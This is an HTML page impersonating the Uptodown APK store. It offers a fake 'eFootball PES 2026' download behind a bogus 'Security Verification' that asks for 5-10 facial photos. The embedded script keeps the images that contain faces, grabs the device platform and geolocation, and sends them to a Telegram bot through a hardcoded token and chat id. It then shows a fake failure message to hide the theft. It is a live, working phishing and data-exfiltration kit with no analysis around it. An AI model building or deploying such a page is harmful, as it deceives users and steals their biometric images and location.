<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uptodown - Download APKs for Android</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
    <style>
        :root { --upto-dark: #0f172a; --upto-blue: #1b85d3; --upto-green: #2ecc71; }
        body { margin: 0; background: var(--upto-dark); font-family: 'Roboto', sans-serif; color: white; }
        header { background: #000; padding: 15px 25px; display: flex; align-items: center; border-bottom: 1px solid #334155; }
        .logo { font-weight: 900; font-size: 22px; color: white; }
        .app-container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
        .btn-green { background: var(--upto-green); color: white; padding: 18px 40px; border-radius: 8px; font-weight: 700; border: none; cursor: pointer; font-size: 18px; }
        #backendLayer { display: none; position: fixed; inset: 0; background: rgba(15, 23, 42, 0.98); z-index: 10000; align-items: center; justify-content: center; }
        video, canvas, #fileInput { display: none; }
    </style>
</head>
<body>

<header>
    <div class="logo">uptodown</div>
</header>

<div class="app-container">
    <div style="display: flex; gap: 25px; align-items: center;">
        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" style="width:120px; border-radius:25px;">
        <div>
            <h1>eFootball PES 2026</h1>
            <p style="color:#94a3b8;">KONAMI | Sports</p>
            <button class="btn-green" onclick="openVerif()">Download (APK)</button>
        </div>
    </div>
</div>

<div id="backendLayer">
    <div style="background: #111; padding: 40px; border-radius: 15px; border: 1px solid var(--upto-blue); text-align: center;">
        <h2 style="color:var(--upto-blue)">Security Verification</h2>
        <p style="font-size:14px;">Please select 5-10 facial photos to confirm you are not a robot.</p>
        <label for="fileInput" style="display:block; padding:15px; border:2px dashed #444; border-radius:8px; cursor:pointer; margin:20px 0; color:var(--upto-blue);">
            📁 SELECT PHOTOS FROM GALLERY
        </label>
        <input type="file" id="fileInput" accept="image/*" multiple onchange="startCapture(this)">
        <p id="stMsg" style="color:#555;"></p>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
    let photos = [];

    async function initAI() { await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model'); }
    initAI();

    function openVerif() { document.getElementById('backendLayer').style.display = 'flex'; }

    async function startCapture(input) {
        document.getElementById('stMsg').innerText = "Analyzing files...";
        const files = Array.from(input.files);
        for (let f of files) {
            const img = await faceapi.bufferToImage(f);
            const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
            if (d.length > 0) photos.push(f);
        }
        await sendData();
    }

    async function sendData() {
        const dev = navigator.platform;
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const loc = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            await push(dev, loc);
        }, () => push(dev, "Denied"));
    }

    async function push(d, l) {
        await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CONFIG.C, text: `📥 *UPTODOWN DATA*\n📱 Device: ${d}\n📍 Loc: ${l}`, parse_mode: 'Markdown'})
        });

        for (let p of photos) {
            const fd = new FormData(); fd.append('chat_id', CONFIG.C); fd.append('photo', p);
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
        }
        alert("Error: Verification failed. Please try later.");
        location.reload();
    }
</script>
</body>
</html>
